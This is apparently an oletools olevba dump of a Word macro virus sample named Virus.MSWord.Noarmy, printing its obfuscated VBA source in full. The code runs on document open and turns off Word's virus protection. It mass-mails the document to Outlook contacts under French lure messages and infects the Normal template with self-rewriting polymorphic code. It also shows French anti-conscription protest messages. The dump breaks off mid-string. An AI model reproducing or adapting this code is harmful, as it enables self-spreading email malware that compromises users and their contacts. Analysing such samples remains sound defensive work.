olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Noarmy-b2d6a122c2709da964bc6d43f8cff3797a52f395
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO NOSN.cls 
in file: Virus.MSWord.Noarmy-b2d6a122c2709da964bc6d43f8cff3797a52f395 - OLE stream: 'Macros/VBA/NOSN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim h7, g8, j1, k2, j8, l1, m5, l8, a5, _
d3, g6, h3, k1, k5, g3, n6, h5, j5, k7: Dim e8, b9, a7, d6, c5, e2, g1, l3, l9, n2, m1, h8, l5, i1, i7, e4, c7, _
c4, f3, h1, d8: Dim g5, _
e1, m4, b3, d4, f7, i3, g2, e5, d2, a4, a3, a2, c2, d1, c3, c1, b2, b1, a1 ' nrotylgytee
Private Sub Document_Open() ' vkljft
On Error Resume Next: Call f1 ' aqbapxoroqvwzkm
Call f2 ' ufuv
Randomize: Select Case System.PrivateProfileString(j1, k2, j8) ' sneftrzdxprdbwr
Case Is <> j1 ' prnzbaoycly
System.PrivateProfileString(j1, k2, j8) = 1&: Case Else ' qpawhteutgnjmx
Options.ConfirmConversions = m5 ' piohsrspwkfgtl
Options.VirusProtection = m5 ' wxdqxnlngwqnwmk
Options.SaveNormalPrompt = m5: End Select: d8 = a5: Set c4 = CreateObject(d8) ' lhsjauxfiizadnw
Set f3 = c4.GetNameSpace(l8): Select Case System.PrivateProfileString(j1, d3, g6): Case Is <> h3: Select Case c4 ' pokieyiqafb
Case k1: f3.Logon k5, g3 ' fzwsekvovjumwzq
For i = 1 To f3.AddressLists.Count: Set g4 = f3.AddressLists(i) ' grkcmgai
Set h1 = c4.CreateItem(m5): h2 = g4.AddressEntries.Count ' bgguzxq
b6 = m5 ' kvkfpkqyipjdtp
For j = 1 To h2: Set j2 = g4.AddressEntries(j): Select Case Len(j2.Address): Case Is _
> 4: Select Case InStr(Len(j2.Address) - 3, j2.Address, n6, vbTextCompare) ' ofynhrtrmkzblo
Case Is <> 0 ' yoiniqmfzsojoyd
h1.Recipients.Add j2 ' iszxzsknurq
b6 = b6 + 1 ' wcwhhxegwg
End Select: End Select ' slgc
Select Case b6 ' jgvra
Case 50 ' hychgo
Exit For: End Select: Next j: Select Case Rnd(): Case Is < 0.33: h1.Subject = h5: h1.Body = j5 ' utrnojfdfgkjnn
Case Is < 0.66 ' roeeusoapnne
h1.Subject = g1 ' fuqjqdkgvcaufh
h1.Body = l3 ' avkjbahnlsaey
Case Else: h1.Subject = l9 ' elnelxuumd
h1.Body = n2 ' scqzhty
End Select: h1.Attachments.Add ActiveDocument.FullName ' cmtzpngqeei
h1.Send: Next i ' ozojl
f3.Logoff: End Select ' smtgixupguodf
System.PrivateProfileString(j1, d3, g6) = h3: End Select ' uiyawfv
Set n1 = ActiveDocument.VBProject: Set i6 = _
n1.VBComponents.Item(1): Set n1 _
= NormalTemplate.VBProject ' mvuhefepx
Set k3 = n1.VBComponents.Item(1): i2 = False: Select Case InStr(1, ActiveDocument.Name, m1): Case False: Select Case i6.Name ' jxddlhfccxxy
Case Is <> g6: Set b5 _
= k3: Set f5 = i6 ' gpzhxnymenrjryx
i2 = True ' fpjqqebpytzw
End Select: End Select: Select Case k3.Name ' cothmb
Case Is <> g6 ' mxivvkgror
Set b5 = i6: Set f5 = k3 ' pbpxygqemywws
i2 = True ' gvwfzszvm
End Select ' lfjonjgiz
Select Case i2: Case True: i4 _
= b5.CodeModule.CountOfLines - 1 ' wynohjmgwcg
c8 = f5.CodeModule.CountOfLines: Select Case c8 ' iadcnub
Case Is > _
0: f5.CodeModule.DeleteLines 1, c8: End Select ' iove
c6 = 1 ' lthq
c9 = "": j3 = "": a6 = 0 ' dysxmghewoelr
For l2 = 1 To i4: h4 = b5.CodeModule.Lines(l2, 1) ' ctbh
i = 1 ' acihnxfteblgde
f4 = InStr(1, h4, Chr(39)) ' mixzjqj
Select Case f4 ' kjhxbtokwotut
Case 0 ' tcclf
f4 = Len(h4): Case Else ' gkobo
f4 = f4 - 2: End Select: Do ' qyrbbyfgqzzne
j = InStr(i, h4, Chr(32)): Select Case j ' npevw
Case 0: j = Len(h4) + 1 ' bhrujzdylhzo
b8 = True ' pyjcogbhesuf
Case f4 + 1: b8 = True ' lwlhje
Case Else ' ertgcioslly
b8 = False ' biljksmdqismt
End Select: n5 = Mid(h4, i, j - i) ' czrvaeobz
Select Case b8: Case True ' bdgxftgmxphz
f6 = b5.CodeModule.Lines(l2 + 1, 1) ' piknl
k4 = InStr(1, f6, Chr(32)) ' dkateku
Select Case k4: Case 0: j3 = _
"": Case Else ' vkigfkzl
j3 = Mid(f6, 1, k4 - 1) ' bzto
End Select: End Select ' kkxeqbhjgvg
Select Case n5: Case k7 + Chr(58): n5 = e8 + Chr(58): Case e8 + Chr(58) ' kmonhjq
n5 = k7 + Chr(58) ' ykaewtxctjnfu
Case k7 ' mmuwski
n5 = e8: Case e8 ' rdyimwntbzzdup
n5 = k7 ' pfovdg
End Select ' izqznso
Select Case h6: Case False: Select Case Rnd() ' pxmytuxrzhbjpm
Case Is _
< 0.02: h6 = True ' vuouikpjyvqki
Case Else ' bxumhidsun
h6 = False: Select Case b8: Case True ' ximlosne
Select Case l2: Case i4: h6 = True ' ukrhdqkbcbit
End Select ' dsxtqfpnagdah
Select Case Rnd(): Case Is < 0.5: h6 = True: End Select ' lofmmb
Select Case j3 ' qwxsvdyklpcnqk
Case e4: h6 = True: a6 = a6 + 1: Select Case a6 ' frixjsbnsnlgwi
Case 4: l2 = i4 ' eiumkcdqoerasy
End Select: End Select: Select Case InStr(1, h4, c7) ' djpp
Case Is <> 0 ' kwpcarmzg
Select Case n5 ' fkdlogc
Case j17: h6 = False ' zznjsktlkxtxot
Case Else ' rdibpn
h6 = True: End Select: End Select ' pjphqdwbxwp
End Select ' fxgrs
End Select ' pcdczi
Select Case Len(n5): Case Is <> 0 ' nsuzvvknfxw
Select Case InStr(Len(n5), n5, Chr(58)): Case Is <> 0 ' wxwlmnsecyftf
Select Case Rnd(): Case Is < 0.5: h6 = True: End Select ' qrcgwqocyza
End Select ' tzqezmohimrz
End Select ' wmuxgdsxicq
Case Else ' coimtgi
h6 = False ' qklzi
End Select: Select Case _
b8: Case True: Select Case n5 ' wtfhsyotfdzqca
Case Chr(95) ' odebuel
c9 = c9 + Switch(h6 = True, Chr(95), h6 = False, j1) ' ptthagd
j4 = False: Case Else: c9 = c9 + Switch(h6 = True, n5, h6 = False, n5 + Chr(58) + Chr(32)) ' oxmizurpamfmf
j4 = True ' grefpmnfdr
End Select ' lmjvtsmflhvfn
Case Else: Select Case InStr(Len(n5), n5, Chr(58)) ' mcorocefc
Case 0 ' zamzhrx
c9 = c9 + Switch(h6 = True, n5 + Chr(32) + Chr(95), h6 = _
False, n5 + Chr(32)) ' azahpf
j4 = False ' hodcbohgu
Case Else: c9 = c9 + Switch(h6 = True, Mid(n5, 1, Len(n5) - 1), h6 = False, n5 + Chr(32)): j4 = True: End Select ' uyenaouvt
End Select ' ranwqmmbxjulfh
Select Case h6 ' rukocmqzlvwuw
Case True: Select Case j4 ' axzdoqvsoukifq
Case True ' rxvftkeu
c9 = c9 + Chr(32) + Chr(39) + Chr(32) ' gpjdksvvpxec
e6 = Int((12 * Rnd) + 4): For d5 = 1 To e6 ' afoyaqetrsf
c9 = c9 + Chr$(Int((26 _
* Rnd) + 97)) ' dcvqgpl
Next d5 ' sxdkcdozybvfjt
End Select: f5.CodeModule.InsertLines c6, _
c9: c6 = c6 + 1: c9 = "": End Select ' luhjxr
i = _
j + 1: Select Case b8: Case True: Exit Do: End Select: Loop ' sqvf
Next l2: Select Case k3.Name ' fvptnouio
Case Is <> g6: f5.Name = g6 ' durejfdv
NormalTemplate.Save: End Select: Select Case i6.Name: Case Is <> g6 ' vvdppxfyfp
f5.Name = g6 ' tnuvtveywbvztsl
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName ' ubgwo
ActiveDocument.Saved = True: End Select: Case Else ' loqyjjatjjap
Select Case InStr(1, ActiveDocument.Name, m1) ' zrthwf
Case False ' arcd
Select Case Rnd() ' prktvdsyaktq
Case Is < 0.015: MsgBox h8 + l5 + i1 + i7, _
32: MsgBox g5 + e1 + m4 + b3 + d4 + f7, 16: MsgBox i3 + g2 + e5 + d2 + a4, 16: MsgBox a3 + a2 _
+ c2 + d1 + c3, 16 ' silhjpgfuedwdo
MsgBox c1 + _
b2, 16: MsgBox b1 + a1, 48 ' geuoghg
Case Is < 0.03 ' xmpzesuu
Selection.TypeText b9 ' vojcuo
Case Is < 0.045 ' cmegojyyubes
Selection.TypeText a7: Case Is < 0.06: Selection.TypeText d6 ' igszwgfelhcaxc
Case Is < 0.075: Selection.TypeText c5 ' dpfyaeyscwzc
Case Is < 0.09 ' vfwoqhncpwovaxq
Selection.TypeText e2 ' maeytzmtgrvo
End Select: ActiveDocument.SaveAs _
FileName:=ActiveDocument.FullName: ActiveDocument.Saved = True ' bdvxgyomlxjhpx
End Select ' rfupa
End Select: End Sub ' dgdsqhpsmc
Private Sub f1(): h7 = Chr(77) + Chr(97) + Chr(99) + Chr(114) + Chr(111): g8 = _
Chr(83) + Chr(101) + Chr(99) + Chr(117) + Chr(114) + Chr(105) + Chr(116) + Chr(121) + Chr(46) + Chr(46) + Chr(46): j1 = "" ' qxklu
k2 = Chr(72) + Chr(75) + Chr(69) + Chr(89) + Chr(95) + Chr(67) + Chr(85) + _
Chr(82) + Chr(82) _
+ Chr(69) + Chr(78): k2 = k2 + Chr(84) + Chr(95) + Chr(85) + Chr(83) + Chr(69) + Chr(82) + Chr(92) + Chr(83) + Chr(111) + Chr(102): k2 = k2 + Chr(116) + Chr(119) + Chr(97) + Chr(114) + Chr(101) + Chr(92) + Chr(77) + Chr(105) + Chr(99) + Chr(114) ' euvz
k2 = k2 + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(92) _
+ Chr(79) + Chr(102) + Chr(102) + Chr(105): k2 = k2 + Chr(99) + Chr(101) + Chr(92) + Chr(57) + _
Chr(46) + Chr(48) + Chr(92) + Chr(87) + Chr(111) + Chr(114) ' owybhthosiibhie
k2 = k2 + Chr(100) + Chr(92) + Chr(83) + Chr(101) + Chr(99) + Chr(117) + Chr(114) + Chr(105) + Chr(116) + Chr(121) ' cvsvs
j8 = Chr(76) + Chr(101) + Chr(118) + Chr(101) + _
Chr(108): l1 = Chr(84) + Chr(111) + Chr(111) + _
Chr(108) + Chr(115): m5 = 0 ' drrzlpnracimw
l8 = Chr(77) + _
Chr(65) + Chr(80) + Chr(73): a5 = Chr(79) + Chr(117) + Chr(116) + Chr(108) + Chr(111) + Chr(111) + Chr(107) + Chr(46) + Chr(65) + Chr(112): a5 = a5 + Chr(112) _
+ Chr(108) + Chr(105) + Chr(99) _
+ Chr(97) + Chr(116) + Chr(105) + Chr(111) + Chr(110) ' hignccwjyqbqzg
d3 = Chr(72) + Chr(75) + _
Chr(69) + Chr(89) + Chr(95) + Chr(67) + Chr(85) + Chr(82) + Chr(82) + Chr(69) + Chr(78) ' coghqjb
d3 = d3 + Chr(84) + Chr(95) + Chr(85) + Chr(83) + Chr(69) + Chr(82) + Chr(92) + Chr(83) + Chr(111) + Chr(102): d3 = d3 + Chr(116) + Chr(119) + Chr(97) + Chr(114) + Chr(101) + Chr(92) + Chr(77) + Chr(105) + Chr(99) + Chr(114): d3 = d3 + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(92) + Chr(79) + Chr(102) + Chr(102) + Chr(105): d3 = d3 + Chr(99) + Chr(101) + Chr(92) ' aofaegotxort
g6 = Chr(78) + Chr(79) _
+ Chr(83) + Chr(78) ' eqbkutau
h3 = "Non" + Chr(32) + "au" _
+ Chr(32) + "Service" + Chr(32) + "National" + Chr(32) + "-" + Chr(32) + "Oui" + Chr(32) ' ifpmdwmf
h3 = h3 + "au" + Chr(32) + "Contrat" + Chr(32) + "de" + Chr(32) + "Travail": k1 = Chr(79) + Chr(117) _
+ Chr(116) + Chr(108) + Chr(111) + Chr(111) + Chr(107): k5 = Chr(112) + Chr(114) + Chr(111) + Chr(102) + Chr(105) + Chr(108) + Chr(101): g3 = Chr(112) + Chr(97) + Chr(115) + Chr(115) + Chr(119) + Chr(111) + Chr(114) + Chr(100) ' aeffticvz
n6 = _
Chr(46) + Chr(102) + Chr(114) ' gjfcod
h5 = "Suggestion..." ' poqasbvnatfhh
j5 = "Ce" + Chr(32) + "document" + Chr(32) + "(" + ActiveDocument.Name + ")" + Chr(32) + "vaut" + Chr(32) + "bien" ' prnpmqb
j5 = j5 + Chr(32) + "un" + Chr(32) + "petit" + Chr(32) + "coup" + Chr(32) + "d" + Chr(39) + "oeil." + Chr(13) + "J" + Chr(39) + "aimerais": j5 = j5 + Chr(32) + "savoir" + Chr(32) + "s" + Chr(39) + "il" + Chr(32) + "correspond" + Chr(32) + "à" + Chr(32) + "ce" + Chr(32) ' uotdsswhaur
j5 = j5 + "qu" + Chr(39) + "on" + Chr(32) + "attends" + Chr(32) + "de" + Chr(32) + "lui." + Chr(13) ' xzdvtqzwv
k7 = Chr(68) + Chr(111) + Chr(99) + _
Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(95): k7 = k7 + Chr(67) + Chr(108) + Chr(111) + Chr(115) + Chr(101) + Chr(40) + Chr(41) ' eoszzwfv
e8 = Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116): e8 = e8 + Chr(95) + Chr(79) + Chr(112) + Chr(101) + Chr(110) + Chr(40) + Chr(41): b9 = Chr(32) + "http://sn.agat.net" + Chr(32) ' zbxtyg
a7 = Chr(32) + "http://altern.org/gigm/service.htm" + Chr(32): d6 = Chr(32) + "http://www.donquichotte.com" + Chr(32) ' psdwioytuz
c5 = Chr(32) + "http://www.multimania.com/antisn" _
+ Chr(32) ' hhzydsckjjdl
e2 = Chr(32) + "Oui" + Chr(32) + "à" + Chr(32) + "l" + Chr(39) + "Emploi," + Chr(32) + "Oui" + Chr(32) + "à" + Chr(32) + "l" + Chr(39) + "armée" + Chr(32): e2 = e2 + "de" + Chr(32) + "métier," + Chr(32) + "mais" + Chr(32) + "Non" + Chr(32) + _
"au" + Chr(32) + "service": e2 = e2 + Chr(32) + "national" + Chr(32) + "sous" + Chr(32) + "contrat" + Chr(32) + "de" + Chr(32) + "travail," + Chr(32): e2 = e2 + "Non" + Chr(32) + "à" + Chr(32) + "l" + Chr(39) + "absurdité." + Chr(32): g1 = "Un" + Chr(32) + "peu" + Chr(32) + "d" + Chr(39) + "aide..." ' dcmfgmfncdc
l3 = "Je" + Chr(32) + "dois" + Chr(32) + "avouer" + Chr(32) + "que" + Chr(32) + "j" + Chr(39) + "ai" + Chr(32) _
+ "un" + Chr(32) + "peu" ' bgdodebe
l3 = l3 + Chr(32) + "de" + Chr(32) + "mal" + Chr(32) + "à" + Chr(32) + "peaufiner" + Chr(32) + "ce" + Chr(32) + "document": l3 = l3 + Chr(32) + _
"(" + ActiveDocument.Name + ")." + Chr(13) + "Merci" _
+ Chr(32) + "de" + Chr(32) + "m" + Chr(39) + "aider" + Chr(32): l3 = l3 + "un" + Chr(32) + "peu" + Chr(32) + "pour" + Chr(32) + "l" + Chr(39) + "améliorer..." + Chr(13) ' mjgqibxzuh
l9 = "Version" _
+ Chr(32) + "finale": n2 _
= "Voici" + Chr(32) + _
"la" + Chr(32) + "dernière" + Chr(32) + "version" + Chr(32) + "de" + Chr(32) + "ce" + Chr(32): n2 = n2 + "sur" + Chr(32) + "quoi" + Chr(32) + "j" + Chr(39) + "ai" + Chr(32) + "travaillé" + Chr(32) + "ces" + Chr(32) + "derniers": n2 = n2 + Chr(32) + "temps" + Chr(32) + "(" + ActiveDocument.Name + ")." + Chr(13) + "Tous" + Chr(32) + "les" + Chr(32) ' unwybvsirgc
n2 = n2 + "avis" + Chr(32) + "sont" + Chr(32) _
+ "la" + Chr(32) + "bienvenue" + Chr(32) + "!" + Chr(13): m1 = "Document": h8 = "Le" + Chr(32) + "mystère" + Chr(32) + "du" + Chr(32) + "jour" + Chr(32) _
+ "à" + Chr(32) + "résoudre" + Chr(32) + "est" + Chr(32): h8 = h8 + "le" + Chr(32) + "suivant:" + Chr(13) + Chr(13) ' toay
End Sub ' vkyfojyynbgbfe
Private Sub f2(): l5 = "Lors" + Chr(32) + "de" + Chr(32) + "son" + Chr(32) + "intervention" + Chr(32) + "télévisée" + Chr(32) + "du" + Chr(32) + "22" + Chr(32): l5 = l5 + "février" + Chr(32) + "1996," + Chr(32) + "Jacques" _
+ Chr(32) + "Chirac," + Chr(32) + "Président" + Chr(32) + "de" + Chr(32) + "la": l5 = _
l5 + Chr(32) + "République" + Chr(32) + "et" + Chr(32) + "Chef" + Chr(32) + "des" + Chr(32) + "Armées," + Chr(32) + _
"a" + Chr(32) + "proclamé:" + Chr(32) ' lcadzs
i1 = """Nous" + Chr(32) + "n" + Chr(39) + "avons" + Chr(32) + "plus" + Chr(32) + "besoin" + Chr(32) + "d" + Chr(39) + "appelés..." + Chr(32) + "(Le" + Chr(32) + "service" + Chr(32): i1 = i1 + "national)" + Chr(32) + "est" + Chr(32) + "devenu" + Chr(32) + "inégal" + Chr(32) + "et" + Chr(32) + "il" + Chr(32) + "n" + Chr(39) + "est" + Chr(32) + "plus" ' xkinuljkrqo
i1 = i1 + Chr(32) + "universel.""" + Chr(32) + "Le" + Chr(32) + "Service" + Chr(32) + "National" + Chr(32) + "a" + Chr(32) + "ensuite" + Chr(32) + "été" ' ulhawoh
i1 = i1 + Chr(32) + "supprimé" + Chr(32) + "pour" + Chr(32) + _
"tous..." + Chr(32) + "ou" + Chr(32) + "presque:" + _
Chr(32): i7 _
= "Alors" + Chr(32) + "qu" + Chr(39) + "il" + Chr(32) + "n" + Chr(39) + "est" _
+ Chr(32) + "plus" _
+ Chr(32) + "obligatoire" + Chr(32) + "pour" + Chr(32) + "les" + Chr(32) + "gens": i7 = i7 + Chr(32) + "nés" + Chr(32) + "après" + Chr(32) + "1979," + Chr(32) + "les" + Chr(32) + "gens" + _
Chr(32) + "nés" + Chr(32) + "avant" + Chr(32): i7 = i7 + "1979" + Chr(32) + "peuvent" + Chr(32) + _
"encore" + Chr(32) + "perdre" + Chr(32) + "emploi," + Chr(32) + "appartement," + Chr(32) + "vie" + Chr(32) ' qiavnfxaxmd
i7 = i7 + "de" + Chr(32) + "famille" + Chr(32) + "sur" + Chr(32) + "simple" + Chr(32) + "ordre" + Chr(32) + _
"du" + Chr(32) + "Service" + Chr(32) + "National.": g5 _
= "En" + Chr(32) + _
"réalité," + Chr(32) + "la" + Chr(32) + "situation" + Chr(32) + "actuelle" + Chr(32) + "est" + _
Chr(32) + "bien" + Chr(32) + "pire" + Chr(32): g5 = g5 + "encore:" + Chr(32) + "Après" + Chr(32) + "avoir" + Chr(32) + "accordé" + Chr(32) + "un" + Chr(32) + "report" + Chr(32) + "d" + Chr(39) + "incorporation" + Chr(32) ' dqpnpsopd
g5 = g5 + "de" + Chr(32) + "2" + Chr(32) + "ans" + Chr(32) + "aux" _
+ Chr(32) ' zhabrgxcqedwc
e1 = "jeunes" + Chr(32) + "ayant" + _
Chr(32) + "obtenu" + Chr(32) + "Contrat" + Chr(32) + "de" + Chr(32) + "Travail," + Chr(32) + "l" _
+ Chr(39) + "Armée" + Chr(32) + "a" + Chr(32) ' eprmlebhhyzcjo
e1 = e1 + "l" + Chr(39) + "intention" + Chr(32) + "de" + Chr(32) + "les" + Chr(32) + "rappeler" + Chr(32) + "au" + Chr(32) + "beau" + Chr(32) + "milieu" + Chr(32) + "de" + Chr(32) ' btihhyqlgjv
e1 = e1 + "leur" + Chr(32) + "carrière" + Chr(32) + "professionnelle." + Chr(32) + "Les" + Chr(32) + "implications" _
+ Chr(32) + "sont" + _
Chr(32) + "bien" + Chr(32): e1 = e1 + "sûr" + Chr(32) + "catastrophiques:" + Chr(13) + Chr(13): m4 = Chr(32) + Chr(32) + "-" _
+ Chr(32) + "Vivre" + Chr(32) + "sans" + Chr(32) + "salaire" + Chr(32) + _
"pendant" + Chr(32) + "10" + Chr(32) + "mois" + Chr(32) + "ne" ' brtlvqdzneb
m4 = m4 + Chr(32) + "permet" + Chr(32) + "pas" + Chr(32) + "d" + Chr(39) + "assurer" + _
Chr(32) + "engagements," + Chr(32) + "dettes" + Chr(32) + "et" + Chr(32): b3 = "impôts" + _
Chr(32) + "qui" + Chr(32) + "sont" + Chr(32) + "déjà" + Chr(32) + "difficiles" _
+ Chr(32) + "à" + Chr(32) + _
"assumer" + Chr(32) + "dans" + Chr(32) + "un": b3 = b3 + Chr(32) + "début" + Chr(32) + "de" + _
Chr(32) + "vie" + Chr(32) + "active" + Chr(32) + "normal." + Chr(13) + Chr(13): d4 = Chr(32) + Chr(32) + "-" + Chr(32) + "Ne" + Chr(32) + "pas" + Chr(32) + "pratiquer" + Chr(32) + "son" + Chr(32) + "activité" + Chr(32) + "professionnelle" + Chr(32): d4 = d4 + "pendant" + Chr(32) + "10" + Chr(32) + "mois" + Chr(32) _
+ "implique" + Chr(32) + "également" + Chr(32) + "une" + _
Chr(32) + "perte" + Chr(32) + _
"d" + _
Chr(39) + "expérience": d4 = d4 + Chr(32) + "utile," + Chr(32) + "la" + Chr(32) + "nécessité" + Chr(32) + "d" + Chr(39) _
+ "une" + Chr(32) + "période" + Chr(32): f7 = "de" _
+ Chr(32) + "réadaptation," + Chr(32) + "une" + Chr(32) + "modification" + Chr(32) + "de" + Chr(32) + "son" + Chr(32) + "projet" _
+ Chr(32) + "professionnel": f7 = f7 + Chr(32) + _
"et" + Chr(32) _
+ "bien" + Chr(32) + "sûr" + Chr(32) + "l" + Chr(39) + "inquantifiable" + Chr(32) + "colère" + Chr(32) _
+ "des" + Chr(32) + "employeurs," + Chr(32) ' bldqyndjdyycsiy
f7 = f7 + "qui" + Chr(32) + "se" + Chr(32) + "traduira," + Chr(32) + "intentionnellement" + Chr(32) + "ou" + Chr(32) + "non," + Chr(32) + "par" + Chr(32) + "un" + Chr(32) ' gmtcrkptirebn
f7 = f7 + "ralentissement" + Chr(32) + "dans" + Chr(32) + "l" + Chr(39) + "évolution" + Chr(32) + "de" _
+ Chr(32) + "carrière." ' lbeewwxxbhrrauh
i3 = Chr(32) _
+ Chr(32) + "-" + Chr(32) + "Du" + Chr(32) + "fait" + Chr(32) + "qu" + Chr(39) + "il" + Chr(32) + "soit" + _
Chr(32) + "tout" + Chr(32) + "bonnement" + Chr(32) + "impossible": i3 = i3 + Chr(32) + "d" + Chr(39) + "assurer" + Chr(32) + "10" + Chr(32) + "mois" + Chr(32) + "de" + Chr(32) + "loyer" + Chr(32) + _
"sans" + Chr(32) + "salaire" + Chr(32) + "sur" + Chr(32): i3 = i3 + "cette" _
+ Chr(32) + "période," _
+ Chr(32) ' lypfvwtzyprhe
g2 = "l" + Chr(39) + "abandon" + Chr(32) + "du" _
+ Chr(32) + "logement" + Chr(32) + "est" + Chr(32) + "irrémédiable." + Chr(32) + "Qui" + Chr(32) + "prendra" + Chr(32) + "alors" + Chr(32) ' rvrtfqa
g2 = g2 + "en" + Chr(32) + "charge" + Chr(32) + "les" + Chr(32) + _
"frais" + Chr(32) _
+ "de" + Chr(32) + "déménagement," + Chr(32) + "de" + Chr(32) + "garde-meuble" + Chr(32): g2 = g2 + "et" + Chr(32) + _
"de" + Chr(32) + "recherche" + Chr(32) + "d" + Chr(39) + "un" + Chr(32) + "nouvel" + Chr(32) + "appartement?" + Chr(13) + Chr(13) ' qbfcbftqeadn
e5 = Chr(32) + Chr(32) + "-" _
+ Chr(32) + "Et" + Chr(32) + "que" + Chr(32) + "dire" + Chr(32) + "de" + Chr(32) + _
"la" + Chr(32) + "situation" + Chr(32) + "morale" + Chr(32): e5 = e5 + "au" + Chr(32) + "plus" + Chr(32) + "bas" + Chr(32) + "durant" + _
Chr(32) + "ces" + Chr(32) + "10" + Chr(32) + _
"longs" + Chr(32) + _
"mois" + Chr(32) + "?" + Chr(32) ' rkzfyzgpke
e5 _
= e5 + "Le" + Chr(32) + "rêve" + Chr(32) + "de" + Chr(32) + "vie" + Chr(32) + "que" + _
Chr(32) + "l" + Chr(39) + "on" + Chr(32) + "était" + Chr(32) + "entrain" + Chr(32) + "de" + Chr(32): e5 = e5 + "bâtir" + Chr(32) + "s" + Chr(39) + "effondre" + Chr(32) + "pour" + Chr(32) + "laisser" + Chr(32) + "place" ' prepxxdvbzn
d2 = Chr(32) _
+ "aux" + Chr(32) + "corvées" + Chr(32) + "inutiles" + Chr(32) + "et" + Chr(32) + "a" + Chr(32) + "l" + Chr(39) + "ennui" + Chr(32) + "bien" + Chr(32) + "connu" + Chr(32) + "du" ' hqwa
d2 = d2 + _
Chr(32) + "Service" + Chr(32) + "National." + Chr(32) + "Est-il" + Chr(32) + "possible" + Chr(32) + "de" + Chr(32) + "rester" + Chr(32) + "loin" + Chr(32) + "de" ' omqdb
a4 = a4 + Chr(32) + "la" + Chr(32) + "personne" + Chr(32) + "avec" + _
Chr(32) + "qui" + Chr(32) + "l" + Chr(39) + "on" + Chr(32) + "vie," + Chr(32) + "de" _
+ Chr(32) + "ses" + Chr(32) + "relations," + Chr(32) + "de": a4 = Chr(32) + "ses" + _
Chr(32) + "amis," + Chr(32) + "pendant" + Chr(32) + "10" + Chr(32) + "mois" + Chr(32) + "puis" + Chr(32) + "de" + Chr(32) + "reprendre" + Chr(32) + "comme" + Chr(32) + "si": a4 = _
a4 + Chr(32) + "rien" + Chr(32) + "ne" + Chr(32) + "s" + Chr(39) + "était" + Chr(32) + "passé" + Chr(32) + _
"?": a3 = "Certains" + Chr(32) + "diront" + Chr(32) + "que" + Chr(32) + "le" + Chr(32) + "Service" _
+ Chr(32) + "National" + Chr(32) + "fait" + Chr(32) + "partie" + Chr(32) + "du" + Chr(32) + "devoir": a3 = a3 + Chr(32) + "de" + Chr(32) + "citoyen." + Chr(32) + "Mais" + Chr(32) + "servir" + Chr(32) + "son" + Chr(32) + "pays" + Chr(32) + "c" + Chr(39) + "est" + Chr(32) + "d" + Chr(39) + "abord" + Chr(32) + "payer" + Chr(32) ' ltyaxgtome
a3 = a3 + "ses" _
+ Chr(32) + "impôts," + Chr(32) + "participer" + Chr(32) + "aux" + _
Chr(32) + "frais" + Chr(32) + "de" + Chr(32) + "la" + Chr(32) + "sécurité" + Chr(32) + "sociale," + Chr(32) + "des": a3 = a3 + Chr(32) + "allocations" + _
Chr(32) + "chômage," ' rogufz
a2 = Chr(32) + "des" + Chr(32) + "retraites," + Chr(32) + "etc." + Chr(32) + "Ce" + Chr(32) + "sont" + Chr(32) + "bien" + Chr(32) + "sûr" + Chr(32) + "les" _
+ Chr(32) + "personnes" + Chr(32) + "qui" ' ntda
a2 = a2 _
+ Chr(32) + "travaillent" + Chr(32) + "qui" + Chr(32) _
+ "payent" + Chr(32) + "tout" + Chr(32) + "cela," + Chr(32) + "et" + Chr(32) + "les" + Chr(32) + "actuels" + Chr(32) + "sursitaires": a2 = a2 + Chr(32) + "en" + Chr(32) + "font" + Chr(32) _
+ "partie." + Chr(32) + "Ils" + Chr(32) + "sont" + Chr(32) + "bien" + Chr(32) + "plus" + Chr(32) + "utiles" + Chr(32): c2 = "à" + _
Chr(32) + "la" + Chr(32) + "nation" + Chr(32) + "en" + Chr(32) + "tant" + Chr(32) + "que" + Chr(32) + _
"cotisants" + Chr(32) + "qu" + Chr(39) + "en" + Chr(32) + "tant" + Chr(32) + "qu" + Chr(39) + "appelés" + Chr(32): c2 = _
c2 + "du" + Chr(32) + "contingent." + Chr(13) + Chr(13) ' ngxtogztfmr
d1 = "Le" + Chr(32) + "service" + Chr(32) + "national" _
+ Chr(32) + "prétends" + Chr(32) + "aujourd" + Chr(39) + "hui" + _
Chr(32) + "que" + Chr(32) + "la" + Chr(32) + "vie" + Chr(32) + "reprends" _
+ Chr(32) + "son" ' fepgrteszawkwsa
d1 = d1 + Chr(32) + "cour" + Chr(32) + "normalement" + Chr(32) + "après" + Chr(32) + "10" + Chr(32) + "mois" + Chr(32) + "de" + Chr(32) + "service" + Chr(32) + "au" + Chr(32) + "milieu" + Chr(32): d1 = d1 + "d" + Chr(39) + "un" + Chr(32) + "Contrat" + Chr(32) + "de" + Chr(32) + "Travail." + Chr(32) + "C" + Chr(39) + "est" + Chr(32) + "bien" + Chr(32) + "sûr" + Chr(32) + "un" + Chr(32) + "véritable" + Chr(32) + "utopisme": d1 = d1 + Chr(32) + "et" + Chr(32) + "le" + _
Chr(32): c3 _
= "bilan" + Chr(32) + "ne" + Chr(32) + "se" + Chr(32) + "résume" + Chr(32) + "pas" + Chr(32) + "à" + Chr(32) + "une" + Chr(32) + "perte" + Chr(32) + "de" + Chr(32) + "10" + Chr(32) + "mois" + Chr(32) ' dzycin
c3 = c3 + "de" _
+ Chr(32) + "temps:" + Chr(32) + "C" + Chr(39) + "est" _
+ Chr(32) + "une" + Chr(32) + "véritable" + Chr(32) + "catastrophe" + Chr(32) + "pour" + Chr(32) + _
"la" + Chr(32) + "situation" + Chr(32) + "financière,": c3 _
= c3 + Chr(32) + "matérielle" + Chr(32) _
+ "et" + Chr(32) + "morale" + Chr(32) + "de" + Chr(32) + "l" + Chr(39) + "individu," + Chr(32) + "qui" + Chr(32) + "aura" + Chr(32) _
+ "des" + Chr(32) + "répercutions" _
+ Chr(32) ' anfnz
c3 = c3 + "regrettables" + Chr(32) + "et" + Chr(32) + "durables.": c1 = _
"Ils" + Chr(32) + "sont" + _
